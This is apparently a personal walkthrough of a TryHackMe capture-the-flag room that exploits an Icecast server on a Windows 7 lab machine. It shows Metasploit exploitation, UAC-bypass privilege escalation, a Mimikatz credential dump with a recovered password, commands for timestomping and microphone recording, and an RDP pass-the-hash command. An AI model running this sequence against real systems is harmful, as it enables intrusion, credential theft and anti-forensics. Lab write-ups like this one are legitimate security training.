# THM
Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on? 3389

What service did nmap identify as running on port 8000? (First word of this service)
Icecast

What does Nmap identify as the hostname of the machine? (All caps for the answer) DARK-PC
┌──(alvan㉿vbox)-[/root]
└─$ nxc smb 10.10.218.232 -u '' -p '' --shares
SMB         10.10.218.232   445    DARK-PC          [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DARK-PC) (domain:Dark-PC) (signing:False) (SMBv1:True)
SMB         10.10.218.232   445    DARK-PC          [+] Dark-PC\: 
SMB         10.10.218.232   445    DARK-PC          [-] Error enumerating shares: STATUS_ACCESS_DENIED
  
  
  
  CVSS scores for CVE-2014-9018
Base Score 	Base Severity 	CVSS Vector 	Exploitability Score 	Impact Score 	Score Source 	First Seen
5.0
	MEDIUM 	AV:N/AC:L/Au:N/C:P/I:N/A:N 	10.0
	2.9
	NIST 	 
  
  
Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use https://www.cvedetails.com for this question and the next. 6.4

What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
  CVE-2004-1561
  
  
After Metasploit has started, let's search for our target exploit using the command 'search icecast'.
 What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module.
exploit/windows/http/icecast_header
<img width="931" height="770" alt="image" src="https://github.com/user-attachments/assets/82262307-0fe7-4f47-aef7-d9b374eeb88d" />


Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.
Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

#Escalate


<img width="796" height="784" alt="image" src="https://github.com/user-attachments/assets/8a5b8592-894b-477d-946a-838bf793e01f" />

Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
meterpreter

What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module. shell

What build of Windows is the system? 7601

Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running? x64

Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
<img width="1067" height="811" alt="image" src="https://github.com/user-attachments/assets/8d4c8b46-b53c-4c0d-a514-710dadb43245" />


Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
 exploit/windows/local/bypassuac_eventvwr  
Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option? LHOST

Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files? SeTakeOwnershipPrivilege <img width="1046" height="801" alt="image" src="https://github.com/user-attachments/assets/0174aa74-85a5-44c6-bd9c-84a903c52f21" />

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service? spoolsv.exe

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
Migrate to this process now with the command `migrate -N PROCESS_NAME`

Let's check what user we are now with the command `getuid`. What user is listed?

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
<img width="791" height="343" alt="image" src="https://github.com/user-attachments/assets/54fa7652-825a-4a4f-8dec-fafdfab178f4" />

Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 

Which command allows up to retrieve all credentials?
lsa_dump_sam
<img width="916" height="365" alt="image" src="https://github.com/user-attachments/assets/ab3d146d-977f-4684-9e6a-12650206de42" />

Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled) crackstation.net <img width="841" height="70" alt="image" src="https://github.com/user-attachments/assets/ae3c0b0b-a834-4393-9c32-6fd1a701a36a" />

Password01!

PostExploiaton
Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts) hashdump

While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time? screenshare
How about if we wanted to record from a microphone attached to the system? record_mic

To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.  timestomp

Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this? golden_ticket_create

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`
xfreerdp /v:10.10.74.248 /u:dark /pth:7c4fe5eada682714a036e39378362bab /cert:ignore

  
